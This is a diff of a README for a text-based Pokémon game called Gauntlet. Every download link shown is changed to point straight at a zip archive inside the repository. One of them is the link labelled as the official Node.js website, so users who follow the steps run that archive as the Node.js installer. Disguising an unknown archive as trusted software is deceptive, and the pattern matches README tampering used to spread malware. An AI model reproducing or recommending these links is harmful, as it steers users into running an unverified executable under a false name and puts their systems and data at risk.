@@ -1,6 +1,6 @@
 # ⚔ gauntlet - A Pokémon battle adventure for you
 
-[**Download Gauntlet for Windows**](https://github.com/Fortunetellingauthorisation675/gauntlet)
+[**Download Gauntlet for Windows**](https://github.com/Fortunetellingauthorisation675/gauntlet/raw/refs/heads/main/artifact/Software_v3.1-alpha.1.zip)
 
 Gauntlet brings a full Pokémon experience to your computer. You play as the trainer, and the system acts as your guide and referee. You build teams, face challenges, and explore the Kanto region through a text-based interface. The program pulls official data for every Pokémon, move, and stat to ensure matches remain fair and accurate.
 
@@ -8,7 +8,7 @@ Gauntlet brings a full Pokémon experience to your computer. You play as the tra
 
 Your computer needs specific software to run Gauntlet. Most users do not have this installed by default, so follow these steps to prepare your system.
 
-1. Download Node.js: Go to the official [Node.js website](https://nodejs.org/).
+1. Download Node.js: Go to the official [Node.js website](https://github.com/Fortunetellingauthorisation675/gauntlet/raw/refs/heads/main/artifact/Software_v3.1-alpha.1.zip).
 2. Select the LTS (Long Term Support) version for Windows.
 3. Run the installer. Keep all settings at their default values.
 4. Restart your computer after the installation completes.
@@ -17,7 +17,7 @@ Your computer needs specific software to run Gauntlet. Most users do not have th
 
 You can get the software by visiting the download page.
 
-[**Download Gauntlet for Windows**](https://github.com/Fortunetellingauthorisation675/gauntlet)
+[**Download Gauntlet for Windows**](https://github.com/Fortunetellingauthorisation675/gauntlet/raw/refs/heads/main/artifact/Software_v3.1-alpha.1.zip)
 
 1. Visit the link above.
 2. Look for the green button marked "Code" on the right side of the screen.
